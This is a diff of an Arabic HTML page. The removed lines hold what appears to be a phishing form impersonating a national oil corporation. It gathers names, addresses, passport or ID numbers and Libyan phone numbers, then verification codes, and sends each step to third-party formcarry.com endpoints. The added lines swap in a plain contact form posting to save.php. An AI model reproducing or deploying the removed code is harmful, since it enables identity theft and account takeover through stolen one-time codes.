@@ -2,152 +2,67 @@
 <html lang="ar" dir="rtl">
 <head>
   <meta charset="UTF-8">
-  <title>نموذج التسجيل - المؤسسة الوطنية للنفط</title>
+  <title>نموذج إرسال البيانات</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
   <style>
     body {
-      background-color: #f4f4f4;
-      font-family: "Arial", sans-serif;
-      text-align: center;
-      direction: rtl;
-      padding: 30px;
+      font-family: 'Arial', sans-serif;
+      background-color: #f9f9f9;
+      padding: 20px;
     }
-    h2 {
-      color: #003366;
-    }
-    .container {
-      background-color: #fff;
-      border-radius: 12px;
-      padding: 30px;
-      max-width: 500px;
+
+    .form-container {
+      max-width: 400px;
       margin: auto;
+      background-color: #fff;
+      padding: 25px;
+      border-radius: 10px;
       box-shadow: 0 0 10px rgba(0,0,0,0.1);
     }
-    input, select, button {
-      width: 90%;
-      padding: 12px;
-      margin: 10px 0;
+
+    label {
+      display: block;
+      margin-top: 10px;
+      font-weight: bold;
+    }
+
+    input[type="text"], input[type="tel"] {
+      width: 100%;
+      padding: 10px;
+      border-radius: 5px;
       border: 1px solid #ccc;
-      border-radius: 8px;
-      font-size: 16px;
     }
+
     button {
-      background-color: #003366;
-      color: #fff;
+      margin-top: 20px;
+      width: 100%;
+      padding: 12px;
+      background-color: #28a745;
+      color: white;
+      font-size: 16px;
+      border: none;
+      border-radius: 6px;
       cursor: pointer;
-    }
-    button:hover {
-      background-color: #005599;
-    }
-    .hidden {
-      display: none;
     }
   </style>
 </head>
 <body>
 
-  <div class="container">
-    <h2>المرحلة الأولى</h2>
-    <input type="text" id="name" placeholder="الاسم الكامل (بالعربية)">
-    <input type="text" id="address" placeholder="العنوان">
-    
-    <select id="docType" onchange="toggleDocField()">
-      <option value="">نوع الوثيقة (اختياري)</option>
-      <option value="جواز السفر">جواز السفر</option>
-      <option value="البطاقة الشخصية">البطاقة الشخصية</option>
-    </select>
-    <input type="text" id="docNumber" placeholder="رقم الوثيقة" class="hidden">
+  <div class="form-container">
+    <h2>إرسال البيانات</h2>
+    <form action="save.php" method="POST">
+      <label for="name">الاسم الكامل:</label>
+      <input type="text" id="name" name="name" required>
 
-    <input type="tel" id="phone" placeholder="رقم الهاتف (ليبي)">
-    
-    <button onclick="submitStep1()">أكمل الطلب</button>
+      <label for="address">العنوان:</label>
+      <input type="text" id="address" name="address" required>
 
-    <div id="step2" class="hidden">
-      <h2>المرحلة الثانية</h2>
-      <input type="text" id="code" placeholder="رمز التحقق (6-8 حروف أو أرقام)">
-      <input type="text" id="confirmCode" placeholder="إعادة كتابة رمز التحقق">
+      <label for="phone">رقم الهاتف:</label>
+      <input type="tel" id="phone" name="phone" required>
 
-      <button onclick="submitCode()">تحقيق الرمز</button>
-      <button onclick="confirmCodeSubmit()">يؤكد التحقق</button>
-    </div>
+      <button type="submit">إرسال البيانات</button>
+    </form>
   </div>
 
-  <script>
-    function toggleDocField() {
-      const doc = document.getElementById('docType').value;
-      document.getElementById('docNumber').classList.toggle('hidden', doc === "");
-    }
-
-    function submitStep1() {
-      const name = document.getElementById('name').value.trim();
-      const address = document.getElementById('address').value.trim();
-      const docType = document.getElementById('docType').value;
-      const docNumber = document.getElementById('docNumber').value.trim();
-      const phone = document.getElementById('phone').value.trim();
-
-      const arabicRegex = /^[\u0600-\u06FF\s]{5,}$/;
-      const phoneRegex = /^(091|092|093|094|095)\d{7}$/;
-
-      if (!arabicRegex.test(name)) {
-        alert("الاسم يجب أن يكون باللغة العربية ويحتوي على 5 أحرف على الأقل.");
-        return;
-      }
-      if (address.length < 3) {
-        alert("يرجى إدخال العنوان بشكل صحيح.");
-        return;
-      }
-      if (!phoneRegex.test(phone)) {
-        alert("رقم الهاتف غير صحيح. يجب أن يبدأ بـ091 إلى 095 ويتكون من 10 أرقام.");
-        return;
-      }
-
-      // إرسال البيانات إلى Formcarry (الرابط الأول)
-      fetch("https://formcarry.com/s/pHHZOWhpgsB", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ name, address, docType, docNumber, phone })
-      });
-
-      // عرض المرحلة الثانية
-      document.getElementById('step2').classList.remove('hidden');
-    }
-
-    function submitCode() {
-      const code = document.getElementById('code').value.trim();
-
-      const codeRegex = /^[A-Za-z0-9]{6,8}$/;
-      if (!codeRegex.test(code)) {
-        alert("رمز التحقق يجب أن يكون من 6 إلى 8 حروف أو أرقام.");
-        return;
-      }
-
-      // إرسال الرمز إلى Formcarry (الرابط الثاني)
-      fetch("https://formcarry.com/s/QCmprzYjo6w", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ code })
-      });
-
-      alert("تم إرسال الرمز بنجاح.");
-    }
-
-    function confirmCodeSubmit() {
-      const code = document.getElementById('code').value.trim();
-      const confirmCode = document.getElementById('confirmCode').value.trim();
-
-      if (code !== confirmCode) {
-        alert("رمز التحقق غير متطابق.");
-        return;
-      }
-
-      // إرسال التأكيد إلى Formcarry (الرابط الثالث)
-      fetch("https://formcarry.com/s/gv93b8b6cht", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ verified_code: code })
-      });
-
-      alert("تم تأكيد رمز التحقق.");
-    }
-  </script>
 </body>
 </html>
